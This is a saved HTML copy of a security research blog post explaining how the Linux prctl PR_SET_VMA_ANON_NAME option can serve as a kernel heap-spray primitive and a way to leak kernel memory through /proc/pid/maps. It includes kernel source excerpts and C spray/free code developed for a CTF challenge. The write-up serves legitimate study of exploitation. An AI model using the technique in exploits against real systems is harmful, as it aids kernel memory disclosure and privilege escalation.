<!DOCTYPE html>
<!-- saved from url=(0075)https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/ -->
<html lang="en" dir="auto"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>prctl anon_vma_name: An Amusing Linux Kernel Heap Spray | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="TLDR prctl PR_SET_VMA (PR_SET_VMA_ANON_NAME) can be used as a (possibly new!) heap spray method targeting the kmalloc-8 to kmalloc-96 caches. The sprayed object, anon_vma_name, is dynamically sized, and can range from larger than 4 bytes to a maximum of 84 bytes. The object can be easily allocated and freed via the prctl syscall, and leaked information can be obtained via reading the proc/pid/maps file. The advantage of this method is that it does not require a cross-cache attack from cg/other caches (unlike other objects such as msg_msg) as anon_vma_name is allocated with the GFP_KERNEL flag.">
<meta name="author" content="Cherie-Anne Lee">
<link rel="canonical" href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/">
<link crossorigin="anonymous" href="https://starlabs.sg/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer="" crossorigin="anonymous" src="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js.下載" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/logo-white.png">
<link rel="apple-touch-icon" href="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/logo-white.png">
<link rel="mask-icon" href="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async="" src="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/js"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="prctl anon_vma_name: An Amusing Linux Kernel Heap Spray">
<meta property="og:description" content="TLDR prctl PR_SET_VMA (PR_SET_VMA_ANON_NAME) can be used as a (possibly new!) heap spray method targeting the kmalloc-8 to kmalloc-96 caches. The sprayed object, anon_vma_name, is dynamically sized, and can range from larger than 4 bytes to a maximum of 84 bytes. The object can be easily allocated and freed via the prctl syscall, and leaked information can be obtained via reading the proc/pid/maps file. The advantage of this method is that it does not require a cross-cache attack from cg/other caches (unlike other objects such as msg_msg) as anon_vma_name is allocated with the GFP_KERNEL flag.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/"><meta property="og:image" content="https://starlabs.sg/logo-white.png"><meta property="article:section" content="blog">
<meta property="article:published_time" content="2023-07-25T00:00:00+00:00">
<meta property="article:modified_time" content="2023-07-25T00:00:00+00:00"><meta property="og:site_name" content="STAR Labs">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png">
<meta name="twitter:title" content="prctl anon_vma_name: An Amusing Linux Kernel Heap Spray">
<meta name="twitter:description" content="TLDR prctl PR_SET_VMA (PR_SET_VMA_ANON_NAME) can be used as a (possibly new!) heap spray method targeting the kmalloc-8 to kmalloc-96 caches. The sprayed object, anon_vma_name, is dynamically sized, and can range from larger than 4 bytes to a maximum of 84 bytes. The object can be easily allocated and freed via the prctl syscall, and leaked information can be obtained via reading the proc/pid/maps file. The advantage of this method is that it does not require a cross-cache attack from cg/other caches (unlike other objects such as msg_msg) as anon_vma_name is allocated with the GFP_KERNEL flag.">
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://starlabs.sg/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "prctl anon_vma_name: An Amusing Linux Kernel Heap Spray",
      "item": "https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "prctl anon_vma_name: An Amusing Linux Kernel Heap Spray",
  "name": "prctl anon_vma_name: An Amusing Linux Kernel Heap Spray",
  "description": "TLDR prctl PR_SET_VMA (PR_SET_VMA_ANON_NAME) can be used as a (possibly new!) heap spray method targeting the kmalloc-8 to kmalloc-96 caches. The sprayed object, anon_vma_name, is dynamically sized, and can range from larger than 4 bytes to a maximum of 84 bytes. The object can be easily allocated and freed via the prctl syscall, and leaked information can be obtained via reading the proc/pid/maps file. The advantage of this method is that it does not require a cross-cache attack from cg/other caches (unlike other objects such as msg_msg) as anon_vma_name is allocated with the GFP_KERNEL flag.",
  "keywords": [
    
  ],
  "articleBody": "TLDR prctl PR_SET_VMA (PR_SET_VMA_ANON_NAME) can be used as a (possibly new!) heap spray method targeting the kmalloc-8 to kmalloc-96 caches. The sprayed object, anon_vma_name, is dynamically sized, and can range from larger than 4 bytes to a maximum of 84 bytes. The object can be easily allocated and freed via the prctl syscall, and leaked information can be obtained via reading the proc/pid/maps file. The advantage of this method is that it does not require a cross-cache attack from cg/other caches (unlike other objects such as msg_msg) as anon_vma_name is allocated with the GFP_KERNEL flag.\nIntroduction and Backstory While doing my internship, I was given a kernel pwn CTF challenge to teach me some fundamental techniques. The vulnerability involved was a race condition leading to a write, and part of the challenge involved leaking a randomly generated secret key which would be XORed with your data before it was written to the memory location. However, how the write worked meant that it wrote a large number of bytes from the start of your target memory location (since you don’t know the XOR key, the write is uncontrollable), and would destroy the headers of many common sprayable objects such as msg_msg, setxattr or add_key. The restrictions on the size of the object and its allocation into GFP_KERNEL kmalloc caches also meant that in order to spray some of these common objects, I would have to perform a cross-cache attack, and for some objects such as sk_buff the cross-cache would have to be across pages of different orders :(((\nOut of desperation to find a slightly less annoying sprayable object, I started looking at syscalls. Ideally, I wanted something that:\n Could be allocated and freed from userspace Could be read from userspace Is pretty useless/has useless headers (so that it would not cause a kernel panic if I overwrote the headers with random garbage and then tried to free the object)  Objects that tend to fit these criteria would probably be those that store strings which would be names of some stuff (e.g. hostname), though the struct used by uname (which I was hoping would be a viable spray) was unfortunately allocated on the stack. Then, I found prctl.\nWhat is prctl? According to the Linux man pages, prctl() manipulates various aspects of the behavior of the calling thread or process.\n#include int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); It does a lot of different stuff, but the option I was interested in is PR_SET_VMA, and its suboption PR_SET_VMA_ANON_NAME. Basically PR_SET_VMA sets an attribute defined in arg2 for a virtual memory area arg3 of size arg4. arg5 specifies the value of the attribute to be set. If arg2 is PR_SET_VMA_ANON_NAME, it will set a name for an anonymous virtual memory area. This sounds like something that would have a useless, sprayable struct!\nIn order for this to work, the option CONFIG_ANON_VMA_NAME must be enabled. As far as I know, this is enabled on the default ubuntu kernel config. For this challenge, I was using Linux kernel version 6.1.37.\nLet’s look at the anon_vma_name struct:\nstruct anon_vma_name { struct kref kref; char name[]; /* The name needs to be at the end because it is dynamically sized. */ }; struct kref { refcount_t refcount; }; Looks very useless! The header would be 4 bytes (since struct kref is 4 bytes), and name is dynamically sized. The maximum size of the name character array is 80, hence this object can have a size ranging from greater than 4 bytes to 84 bytes.\nLet’s trace the kernel code flow:\nstatic int prctl_set_vma(unsigned long opt, unsigned long addr, unsigned long size, unsigned long arg) { struct mm_struct *mm = current-mm; const char __user *uname; struct anon_vma_name *anon_name = NULL; int error; switch (opt) { case PR_SET_VMA_ANON_NAME: uname = (const char __user *)arg; if (uname) { char *name, *pch; name = strndup_user(uname, ANON_VMA_NAME_MAX_LEN); if (IS_ERR(name)) return PTR_ERR(name); for (pch = name; *pch != '\\0'; pch++) { if (!is_valid_name_char(*pch)) { // [1] \tkfree(name); return -EINVAL; } } /* anon_vma has its own copy */ anon_name = anon_vma_name_alloc(name); // [2] \tkfree(name); if (!anon_name) return -ENOMEM; } mmap_write_lock(mm); error = madvise_set_anon_name(mm, addr, size, anon_name); mmap_write_unlock(mm); anon_vma_name_put(anon_name); break; default: error = -EINVAL; } return error; } In the code above, it checks ([1]) whether the inputted name has valid, printable characters. If the check passes ([2]), anon_vma_name_alloc is called:\nstruct anon_vma_name *anon_vma_name_alloc(const char *name) { struct anon_vma_name *anon_name; size_t count; /* Add 1 for NUL terminator at the end of the anon_name-name */ count = strlen(name) + 1; anon_name = kmalloc(struct_size(anon_name, name, count), GFP_KERNEL); // [3] \tif (anon_name) { kref_init(\u0026anon_name-kref); memcpy(anon_name-name, name, count); } return anon_name; } Here ([3]), the struct is allocated by kmalloc, and as GFP_KERNEL is specificed, it will go into a normal kmalloc cache. This is very convenient because we can basically spray this into any cache from kmalloc-8 to kmalloc-96, and we can avoid any annoying cross-caching from cg caches!\nLet’s see how to read from the spray (thanks to my mentor for this bit!). Looking at the show_map_vma function:\nif (file) { seq_pad(m, ' '); /* * If user named this anon shared memory via * prctl(PR_SET_VMA ..., use the provided name. */ if (anon_name) seq_printf(m, \"[anon_shmem:%s]\", anon_name-name); else seq_file_path(m, file, \"\\n\"); goto done; } As the newly set name is used, it appears we can read from it via the /proc/pid/maps file, allowing us to possibly leak stuff from kernel memory from the maps file. However, the limitation of this method is that if the information to be leaked contains null bytes, it will print up to those null bytes, and then stop. If you are lucky and you have a kernel text/heap pointer with no null bytes, this method could potentially be used to bypass KASLR.\nLet’s look at how the spray can be freed:\nvoid anon_vma_name_free(struct kref *kref) { struct anon_vma_name *anon_name = container_of(kref, struct anon_vma_name, kref); kfree(anon_name); } Presumably how this object is freed is similar to how files are freed. When the process dies, or if prctl is called again and the name buffer is set to NULL, the reference count is decremented. If the reference count becomes 0, the anon_vma_name object is freed.\nHow to spray anon_vma_name Spraying anon_vma_name is simple: just use the prctl syscall with PR_SET_VMA and PR_SET_VMA_ANON_NAME arguments. One way of doing this is as shown (sorry for bad code):\n#define NUM_PRCTLS 1024 void * address[NUM_PRCTLS]; int rename_vma(unsigned long addr, unsigned long size, char *name) { int res; res = prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, addr, size, name); if (res  0) perror(\"[!] prctl\"); return -errno; return res; } static void spray_vma_name(void) { for (int idx = 0; idx  NUM_PRCTLS; idx++) { address[idx] = mmap(NULL, 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); char buf[80]; char test_str[] = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"; memcpy(buf, test_str, 72); char store[8]; memset(store, 0, 8); sprintf(store, \"%d\", idx); memcpy(\u0026buf[72], store, 8); rename_vma((unsigned long) address[idx], 1024, buf); } } The names assigned need to be different, because if the same name is used, the kernel would reuse the same anon_vma_name object, and the spray will fail. This is shown in the kernel code:\nstatic inline struct anon_vma_name *anon_vma_name_reuse(struct anon_vma_name *anon_name) { /* Prevent anon_name refcount saturation early on */ if (kref_read(\u0026anon_name-kref)  REFCOUNT_MAX) { anon_vma_name_get(anon_name); return anon_name; } return anon_vma_name_alloc(anon_name-name); } On gdb, the spray looks as such (the garbage data above the spray is what I wanted to read, it was written to the same address as the sprayed object due to how the challenge works):\nIn order to read from the spray, all you need to do is to cat the /proc/pid/maps file!\nYou can also do it programmatically in your code:\nThe last hexadecimal number is the leaked secret key which was written to the anon_vma_name object, and is the same as that in the first image.\nAs very well put by my fellow intern, this is the equivalent of leaking stuff from kernel memory via the task manager :D\nTo free the spray, all you need to do is to use the prctl syscall again, but this time setting the name buffer to NULL.\nfor (int i = 0; i  NUM_PRCTLS; i++) { rename_vma((unsigned long) address[i], 1024, NULL); } Conclusion prctl’s PR_SET_VMA can be used as a nice convenient heap spray into kmalloc-8 to kmalloc-96. Thanks to Billy for mentoring me and I hope to learn and find more interesting things in the weeks to come! :D\nReferences  https://elixir.bootlin.com/linux/v6.1.37/source/include/linux/mm_inline.h https://man7.org/linux/man-pages/man2/prctl.2.html  ",
  "wordCount" : "1417",
  "inLanguage": "en",
  "datePublished": "2023-07-25T00:00:00Z",
  "dateModified": "2023-07-25T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Cherie-Anne Lee"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
<style type="text/css">@font-face {
  font-family: 'rbicon';
  src: url(chrome-extension://dipiagiiohfljcicegpgffpbnjmgjcnf/fonts/rbicon.woff2) format("woff2");
  font-weight: normal;
  font-style: normal; }
</style></head>
<body class=" dark" id="top">
<header class="header">
<nav class="nav">
<div class="logo">
<a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
<img src="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/logo-white.png" alt="logo" aria-label="logo" height="35"> </a>
<span class="logo-switches">
</span>
</div>
<ul id="menu">
<li>
<a href="https://starlabs.sg/" title="Home">
<span>Home</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/about/" title="About">
<span>About</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/advisories/" title="Advisories">
<span>Advisories</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/blog/" title="Blog">
<span>Blog</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/achievements/" title="Achievements">
<span>Achievements</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/publications/" title="Publications">
<span>Publications</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/search/" title="Search (Alt + /)" accesskey="/">
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class="main">
<article class="post-single">
<header class="post-header">
<div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/blog/">Blogs</a></div>
<h1 class="post-title">
prctl anon_vma_name: An Amusing Linux Kernel Heap Spray
</h1>
<div class="post-meta"><span title="2023-07-25 00:00:00 +0000 UTC">July 25, 2023</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Cherie-Anne Lee
</div>
</header> <div class="toc">
<details>
<summary accesskey="c" title="(Alt + C)">
<span class="details">Table of Contents</span>
</summary>
<div class="inner"><ul>
<li>
<a href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#tldr" aria-label="TLDR">TLDR</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#introduction-and-backstory" aria-label="Introduction and Backstory">Introduction and Backstory</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#what-is-prctl" aria-label="What is prctl?">What is prctl?</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#how-to-spray-anon_vma_name" aria-label="How to spray anon_vma_name">How to spray anon_vma_name</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#conclusion" aria-label="Conclusion">Conclusion</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#references" aria-label="References">References</a>
</li>
</ul>
</div>
</details>
</div>
<div class="post-content"><h2 id="tldr">TLDR<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#tldr">#</a></h2>
<p><code>prctl PR_SET_VMA (PR_SET_VMA_ANON_NAME)</code> can be used as a (possibly new!) heap spray method targeting the <code>kmalloc-8</code> to <code>kmalloc-96</code> caches. The sprayed object, <code>anon_vma_name</code>, is dynamically sized, and can range from larger than 4 bytes to a maximum of 84 bytes. The object can be easily allocated and freed via the <code>prctl</code> syscall, and leaked information can be obtained via reading the <code>proc/pid/maps</code> file. The advantage of this method is that it does not require a cross-cache attack from cg/other caches (unlike other objects such as <code>msg_msg</code>) as <code>anon_vma_name</code> is allocated with the <code>GFP_KERNEL</code> flag.</p>
<h2 id="introduction-and-backstory">Introduction and Backstory<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#introduction-and-backstory">#</a></h2>
<p>While doing my internship, I was given a kernel pwn CTF challenge to teach me some fundamental techniques. The vulnerability involved was a race condition leading to a write, and part of the challenge involved leaking a randomly generated secret key which would be XORed with your data before it was written to the memory location. However, how the write worked meant that it wrote a large number of bytes from the start of your target memory location (since you don’t know the XOR key, the write is uncontrollable), and would destroy the headers of many common sprayable objects such as <code>msg_msg</code>, <code>setxattr</code> or <code>add_key</code>. The restrictions on the size of the object and its allocation into <code>GFP_KERNEL</code> kmalloc caches also meant that in order to spray some of these common objects, I would have to perform a cross-cache attack, and for some objects such as <code>sk_buff</code> the cross-cache would have to be across pages of different orders :(((</p>
<p>Out of desperation to find a slightly less annoying sprayable object, I started looking at syscalls. Ideally, I wanted something that:</p>
<ol>
<li>Could be allocated and freed from userspace</li>
<li>Could be read from userspace</li>
<li>Is pretty useless/has useless headers (so that it would not cause a kernel panic if I overwrote the headers with random garbage and then tried to free the object)</li>
</ol>
<p>Objects that tend to fit these criteria would probably be those that store strings which would be names of some stuff (e.g. hostname), though the struct used by uname (which I was hoping would be a viable spray) was unfortunately allocated on the stack. Then, I found <code>prctl</code>.</p>
<h2 id="what-is-prctl">What is prctl?<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#what-is-prctl">#</a></h2>
<p>According to the Linux man pages, <code>prctl()</code> manipulates various aspects of the behavior of the calling thread or process.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="cp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="cpf"><span class="hljs-meta"><span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span></span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">prctl</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">option</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">arg2</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">arg3</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">arg4</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">arg5</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span>;</span>
</span></span></code></pre></div><p>It does a lot of different stuff, but the option I was interested in is <code>PR_SET_VMA</code>, and its suboption <code>PR_SET_VMA_ANON_NAME</code>. Basically <code>PR_SET_VMA</code> sets an attribute defined in <code>arg2</code> for a virtual memory area <code>arg3</code> of size <code>arg4</code>. <code>arg5</code> specifies the value of the attribute to be set. If <code>arg2</code> is <code>PR_SET_VMA_ANON_NAME</code>, it will set a name for an anonymous virtual memory area. This sounds like something that would have a useless, sprayable struct!</p>
<p>In order for this to work, the option <code>CONFIG_ANON_VMA_NAME</code> must be enabled. As far as I know, this is enabled on the default ubuntu kernel config. For this challenge, I was using Linux kernel version 6.1.37.</p>
<p>Let’s look at the <code>anon_vma_name</code> struct:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_vma_name</span></span></span><span class="hljs-class"> </span><span class="p"><span class="hljs-class">{</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">kref</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">kref</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">char</span></span> <span class="n">name</span><span class="p">[];</span> <span class="cm"><span class="hljs-comment">/* The name needs to be at the end because it is dynamically sized. */</span></span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">kref</span></span></span><span class="hljs-class"> </span><span class="p"><span class="hljs-class">{</span></span>
</span></span><span class="line"><span class="cl">  <span class="n"><span class="hljs-keyword">refcount_t</span></span> <span class="n">refcount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>Looks very useless! The header would be 4 bytes (since <code>struct kref</code> is 4 bytes), and name is dynamically sized. The maximum size of the name character array is 80, hence this object can have a size ranging from greater than 4 bytes to 84 bytes.</p>
<p>Let’s trace the kernel code flow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">prctl_set_vma</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">opt</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">addr</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params">
</span></span></span></span><span class="line"><span class="cl"><span class="hljs-function"><span class="hljs-params">			 </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">size</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">arg</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">mm_struct</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">mm</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">=</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">current</span></span></span><span class="o"><span class="hljs-class">-&gt;</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">mm</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">const</span></span> <span class="kt"><span class="hljs-keyword">char</span></span> <span class="n">__user</span> <span class="o">*</span><span class="n">uname</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_vma_name</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_name</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">=</span></span><span class="hljs-class"> </span><span class="nb"><span class="hljs-class"><span class="hljs-title">NULL</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">	<span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">error</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">switch</span></span> <span class="p">(</span><span class="n">opt</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">case</span></span> <span class="nl">PR_SET_VMA_ANON_NAME</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">uname</span> <span class="o">=</span> <span class="p">(</span><span class="k"><span class="hljs-keyword">const</span></span> <span class="kt"><span class="hljs-keyword">char</span></span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">uname</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kt"><span class="hljs-keyword">char</span></span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="o">*</span><span class="n">pch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">name</span> <span class="o">=</span> <span class="n">strndup_user</span><span class="p">(</span><span class="n">uname</span><span class="p">,</span> <span class="n">ANON_VMA_NAME_MAX_LEN</span><span class="p">);</span>
